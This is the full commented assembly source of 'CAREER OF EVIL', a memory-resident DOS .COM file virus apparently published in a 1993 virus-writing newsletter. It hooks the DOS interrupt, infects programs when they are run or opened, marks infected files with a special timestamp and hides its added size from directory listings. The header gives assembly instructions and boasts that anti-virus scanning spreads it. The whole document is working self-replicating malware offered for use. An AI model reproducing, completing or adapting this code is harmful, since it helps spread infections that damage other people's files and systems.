;CAREER OF EVIL virus:  a simple memory resident .COMinfector
;which infects on execution and file open.  CAREER OF EVIL also
;has limited stealth, subtracting its file size from infected files
;by diddling the file control block on "DIR" functions BEFORE the
;user sees the result onscreen.  The virus recognizes infected
;files by setting a peculiar time-stamp in the unreported seconds
;field.  Anti-virus measures are complicated when the virus is
;in memory by its ability to infect on file open.  Scanning or
;operating any utilities which open files for inspection will
;spread the virus to every file examined in this manner.
;For best results, assemble CAREER OF EVIL with the A86 assembler.
;CAREER OF EVIL: prepared by Urnst Kouch for CRYPT NEWSLETTER 15,
;MAY-JUNE 1993.


       code  segment
	     assume  cs:code, ds:code, es:code, ss:nothing

	     org     0100h



begin:         call    virus       ;

host           db   'Í RottenUK'   ; dummy place-holder where   
				   ; virus stashes original 5-bytes
				   ; from host file
db             'Career of Evil',0


virus:          pop     bp
		push    bp
		add     bp,0FEFDh

		mov     ax,0ABCDh    ; put 0ABCDh into ax
		int     21h          ; for installation check
				     ; (also critical in directory stealth)
		jnb      failed      ; if virus is already there,
				     ; will branch
		cli                  ; to virus exit when in memory
		mov     ax,3521h
		int     21h                      ; get interrupt vector
		mov     w [bp+offset oldint21],bx      ; es:bx points to
		mov     w [bp+offset oldint21+2],es    ; interrupt handler

		mov     al,1Ch
		int     21h


		mov     si,ds
		std
		lodsb
		cld
		mov     ds,si

		xor     bx,bx
		mov     cx,pargrph   ; virus size in paragraphs to allot-->cx
		mov     ax,[bx+3]    ; an off hand way of doing things
		sub     ax,cx   ;

		mov     [bx+3],ax
		sub     [bx+12h],cx
		mov     es,[bx+12h]

		push    cs
		pop     ds

		mov     di,100h
		mov     si,bp
		add     si,di
		mov     cx,size
		rep     movsb   ; start copying virus into memory

		push    es
		pop     ds
		mov     ax,2521h
		mov     dx,offset newint21  ; set int 21 route through virus
		int     21h

failed:         push    cs
		push    cs
		pop     ds
		pop     es

		pop     si
		mov     di,100h
		push    di
		jmp     $ + 2
		movsw
		movsw
		jmp     $ + 2
		movsb

		mov     cx,0FFh
		mov     si,100h
		ret                 ; exit to host

newint21:       pushf
		cmp     ah,11h    ; any "dir" user access of file control
		je      stealth_entry   ; block must come through virus
		cmp     ah,12h    ; next file directory handler
		je      stealth_entry

		cmp     ax,0ABCDh  ; we need this so that when the virus
		jne     not_virus_input ; is controlling things, on
		popf                ; file infect it doesn't go
		clc                 ; and subtract another length
		retf    2           ; increment from the directory
				    ; entries of infected files.
				    ; although an amusing effect,
				    ; reducing the filesize of all
				    ; infected files as reported
				    ; by DIR one virus length everytime
				    ; the virus infects ANY file is
				    ; counter-productive
not_virus_input:
		cmp     ax,4B00h    ; is a program being loaded?
		je      check_infect ; try to infect
		cmp     ah,3Dh      ; is a file being opened?
		je      start_open_infect ; if so, get address
		jne     not_4B00    ; exit if not

stealth_entry:

		popf
		call    int21     ; look to virus "stealth"
		pushf             ; routine
		call    stealth_begin

cycle_dirstealth:
		popf              ; remove word from the stack
		iret              ; and return from interrupt
				  ; to where we were before pulling
stealth_begin:                    ; stealth trick
		push    ax        ; the following essentially massages the
		push    bx        ; file control block on directory scans,
		push    dx        ; subtracting the virus size from infected
		push    es        ; files before the user sees it
				  ; stack setup saves everything
		mov     ah,2Fh    ; get disk transfer address
		call    int21     ;

		add     bx,8

normalize_direntry:

		mov     al,byte es:[bx+16h]  ; retrieve seconds data
		and     al,1fh           ; from observed file, if it's
		xor     al,1fh           ; 31, the file is infected
		jnz     no_edit_entry    ; not 31 - file not infected
		mov     ax,word es:[bx+1Ch]
		mov     dx,word es:[bx+1Ch+2]
		sub     ax,size       ; subtract virus length from
		sbb     dx,0          ; infected file
		jc      no_edit_entry   ; no files? exit
		mov     word es:[bx+1Ch],ax
		mov     word es:[bx+1Ch+2],dx
no_edit_entry:                 ; restore everything as normal
		pop     es         ;
		pop     dx
		pop     bx
		pop     ax
		ret

start_open_infect:

		mov word ptr cs:[fileseg],dx
		mov word ptr cs:[fileseg+2h],ds  ; save segment:offset of
						 ; file being opened so it
						 ; can be infected, too
check_infect:   push    ax          ; push everything onto stack
		push    bx
		push    cx
		push    dx
		push    ds
		push    bp

		mov     ax,4300h     ; get file attributes of potential host
		call    int21
		jc      back1        ; failed? exit
		mov     cs:old_attr,cx   ; put attributes here


		mov     ax,4301h     ; set new file attributes, read or write
		xor     cx,cx
		call    int21        ; do it
		jc      back1        ; error? exit

		push    dx
		push    ds
		call    infect       ; call infection subroutine
		pop     ds
		pop     dx

		mov     ax,4301h     ; same as above
		db      0B9h         ; hand code mov CX,
old_attr        dw      0
		call    int21

back1:                               ; if the attrib-get fails
		pop     bp           ; pop everything off stack
		pop     ds
		pop     dx
		pop     cx
		pop     bx
		pop     ax


not_4B00:

back:           popf
		db 0EAh   ; <--------- return to virus exit to host

oldint21        dw 0,0

int21:          pushf
		call    dword ptr cs:oldint21   ; <--interrupt handler
		ret

infect:         mov     ax,3D02h    ; open host file with read/write access
		call    int21
		jnc     okay_open
		ret                 ; was there an error? exit

okay_open:       xchg    bx,ax
		 mov     ax,5700h   ; get file date and file time
		 call    int21

		 push    cx
		 mov     bp,sp
		 push    dx

		 mov     al,cl       ; retrieve seconds data from file one                                        
		 or      cl,1fh      ; more time              
		 xor     al,cl       ; if it's 31 (1fh), we get a zero            
		 jz      close       ; and the file is already infected         
	     
		 mov     ah,3Fh   ; read first five bytes from potential host
		 mov     cx,5
		 mov     dx,offset host ; store them here
		 push    cs
		 pop     ds
		 call    int21
		 jc      close       ; error, exit?
		 cmp     al,5        ; get the five bytes?
		 jne     close       ; no, so exit

		cmp     word host[0],'ZM' ; check, is this an .EXE file?
		je      close             ; yes, so no infection
		cmp     host[0],0E9h      ; does it start with a jump?
		je      infect_host       ; yes - infect.  Here's a
					  ; subtle point. MUST look for 0e9h
					  ; or file is not .EXE, not marked
					  ; virus time-stamp, infection will
close:                                    ; result in the virus adding itself
					  ; to almost anything loaded or
		pop     dx              ; opened which is not an .EXE or
		pop     cx              ; .OVL.  The result would be a hang.
		mov     ax,5701h         ; reset file date and time
		call    int21
		mov     ah,3Eh           ; close file
		call    int21
		ret                      ; exit

infect_host:    mov     ax,4202h         ; reset pointer to end of file
		xor     cx,cx            ; a standard appending infection
		xor     dx,dx            ; routine which is suitable
		call    int21            ; for most resident .COM infecting
					 ; viruses
		or      dx,dx
		jnz     close


		dec     ax     
		dec     ax     
		dec     ax

		mov     word ptr putjmp[1],ax

		mov     ah,40h         ; write virus to the target file
		mov     cx,size        ; length in cx
		mov     dx,100h
		call    int21
		jc      close

		mov     ax,4200h      ; set file pointer to beginning of host
		xor     cx,cx
		xor     dx,dx
		call    int21

		mov     ah,40h       ; write the first five bytes of the
		mov     cx,5         ; viral jump and vanity string to the
		mov     dx,offset putjmp ; beginning of the host file
		call    int21

		or      byte ss:[bp],31 ; set the seconds field to 31, so the
					; "stealth" routine has its cue
		jmp     close           ; close the file and clean up




putjmp          db 0E9h        ; <----- data, jump and vanity sig for
		dw 0           ; virus to copy to beginning of host
		db 'UK'



fileseg         dd      ?      ; <--- buffer for seg:off of files
			       ; opened by user activated programs


mark:                    ; <-----end of virus

size    equ $-100h       ;
pargrph equ ($+16)/16    ; virus size in memory in 16-byte
			 ; paragraphs


	code   ends
	       end   begin


